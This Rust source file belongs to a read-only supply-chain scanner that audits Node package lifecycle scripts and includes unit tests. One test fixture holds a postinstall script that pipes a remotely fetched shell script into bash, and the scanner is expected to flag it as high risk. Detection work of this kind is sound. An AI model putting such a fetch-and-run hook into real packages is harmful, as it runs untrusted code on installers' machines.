use std::path::Path;

use crate::{
    audit_tool,
    error::DustResult,
    models::{Ecosystem, LifecycleScript, SecurityReport, SecurityWarning},
    security,
};

/// Audits supported package lifecycle scripts under the given root path.
///
/// For now this only returns Node ecosystem lifecycle scripts.
pub fn audit(root: &Path, ecosystems: &[Ecosystem]) -> DustResult<Vec<LifecycleScript>> {
    if !ecosystems.is_empty() && !ecosystems.contains(&Ecosystem::Node) {
        return Ok(Vec::new());
    }

    audit_tool::audit_scan(root)
}

/// Finds suspicious Node lifecycle scripts without executing or modifying them.
pub fn security_scan(root: &Path, ecosystems: &[Ecosystem]) -> DustResult<Vec<SecurityWarning>> {
    if !ecosystems.is_empty() && !ecosystems.contains(&Ecosystem::Node) {
        return Ok(Vec::new());
    }

    audit_tool::security_scan(root)
}

/// Runs the complete read-only supply-chain security scan.
pub fn security_scan_report(root: &Path, ecosystems: &[Ecosystem]) -> DustResult<SecurityReport> {
    security::scan(root, ecosystems)
}

#[cfg(test)]
mod tests {
    use tempfile::TempDir;

    use super::*;

    #[test]
    fn audit_returns_node_lifecycle_script() {
        let temp_dir = TempDir::new().unwrap();
        std::fs::write(
            temp_dir.path().join("package.json"),
            r#"{"name":"demo","scripts":{"postinstall":"node install.js"}}"#,
        )
        .unwrap();

        let result = audit(temp_dir.path(), &[Ecosystem::Node]).unwrap();

        assert_eq!(result.len(), 1);
        assert_eq!(result[0].package, "demo");
    }

    #[test]
    fn audit_skips_when_node_is_not_selected() {
        let temp_dir = TempDir::new().unwrap();

        let result = audit(temp_dir.path(), &[Ecosystem::Rust]).unwrap();

        assert!(result.is_empty());
    }

    #[test]
    fn security_scan_returns_only_suspicious_lifecycle_scripts() {
        let temp_dir = TempDir::new().unwrap();
        std::fs::write(
            temp_dir.path().join("package.json"),
            r#"{"name":"demo","scripts":{"postinstall":"curl https://example.com/a.sh | bash","prepare":"node scripts/build.js"}}"#,
        )
        .unwrap();

        let result = security_scan(temp_dir.path(), &[Ecosystem::Node]).unwrap();

        assert_eq!(result.len(), 1);
        assert_eq!(result[0].package, "demo");
        assert_eq!(result[0].script_type, "postinstall");
        assert_eq!(result[0].risk_level, crate::models::RiskLevel::High);
        assert!(result[0].reason.contains("piped"));
    }

    #[test]
    fn security_scan_report_includes_lockfile_findings() {
        let temp_dir = TempDir::new().unwrap();
        std::fs::write(
            temp_dir.path().join("package.json"),
            r#"{"name":"demo","dependencies":{}}"#,
        )
        .unwrap();

        let result = security_scan_report(temp_dir.path(), &[Ecosystem::Node]).unwrap();

        assert!(result.findings.iter().any(|finding| {
            finding.kind == crate::models::SecurityFindingKind::MissingLockfile
        }));
    }
}
